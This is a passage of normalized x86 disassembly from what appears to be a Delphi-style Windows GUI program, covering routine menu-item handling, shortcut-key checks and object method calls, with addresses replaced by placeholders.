test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450910
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450930
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450950
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450970
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414518
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44a7c0
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_44a8f8
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_44a958
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_44a658
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_44aa18
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4509e8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a400
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4500fc
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_450598
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_450a3c
jmp r-xdata
xor edx edx
mov eax esi
call sub_44e500
sub_450a3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44bed4
mov eax ebx
call sub_450aac
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44bf18
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_41a1b4
sub_450a84
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_450a84
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44dbd4
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_450518
mov eax ebx
pop esi
pop ebx
retn
sub_450ac0
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c314
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4045d4
sub_450af0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40410c
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_450b74
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_450c96
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404334
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404334
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404594
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404480
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c9d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404098
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_40461c
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4043f4
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404334
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404594
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4043f4
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_450cd4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_451173
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40410c
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_451134
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_450114
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_40410c
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45117a
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_404098
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_404098
lea eax [ ebp - 0x18 ]
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax ebx
call sub_451328
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_450124
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404480
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_450af0
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_450124
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450124
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032a0
mov eax [ ebp - 0x20 ]
call sub_4032a0
mov eax [ ebp - 0x14 ]
call sub_4032a0
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_450af0
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404334
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_450124
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_452bcc
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407cfc
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_4040c8
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c314
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c314
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_450124
push eax
mov edx esi
mov eax ebx
call sub_450124
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404594
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407cfc
push ebp
mov eax [ ebp - 0x2c ]
call sub_450ac0
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_450ac0
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c314
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_40410c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450124
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_450124
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_452b38
mov edx [ ebp - 0x40 ]
pop eax
call sub_4040c8
mov edx esi
mov eax ebx
call sub_450124
push eax
mov edx esi
mov eax ebx
call sub_450124
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404334
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404594
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_450b74
mov eax [ ebp - 0x18 ]
call sub_404334
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4045d4
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_40461c
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_450b74
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_4511d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_450114
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_450114
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_451354
test al al
je r-xdata
mov eax esi
call sub_450114
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_450124
call sub_4511ac
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_450124
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_450124
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_450124
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_450124
call sub_4511ac
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_450124
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_450124
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_450124
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_450124
call sub_4511ac
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_451328
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_451328
and eax 0x7f
mov al [ eax + rw-data ]
sub_451354
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_451354
and eax 0x7f
mov al [ eax + rw-data ]
sub_451380
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44e068
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41a0e4
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_4520ac
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_45141c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_4032a0
mov eax [ esi + 0x44 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a130
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_451490
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_451490
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44dbd4
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_450518
mov eax ebx
pop esi
pop ebx
retn
sub_4514d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_450114
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_450124
call sub_4514d0
pop ecx
test al al
je r-xdata
sub_451568
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_4514d0
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44dbd4
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_451598
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_451568
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_4528bc
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_451608
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_451568
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_451624
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_451568
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_450cd4
mov ebx eax
xor edx edx
mov eax edi
call sub_4511d0
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_45063c
mov eax [ esi + 0x34 ]
call sub_45063c
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_44e578
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_4445f8
push eax
call DrawMenuBar
sub_451710
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_451710
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push j_sub_403740#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_451568
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45063c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_451700
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_451864
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4248a4
xor eax eax
push ebp
push sub_451962
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4248a4
xor eax eax
push ebp
push sub_451937
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_451710
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42489c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451969
mov eax [ rw-data ]
call sub_42489c
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_451568
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_451988
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_451d0c
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_451d0c
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_451a44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
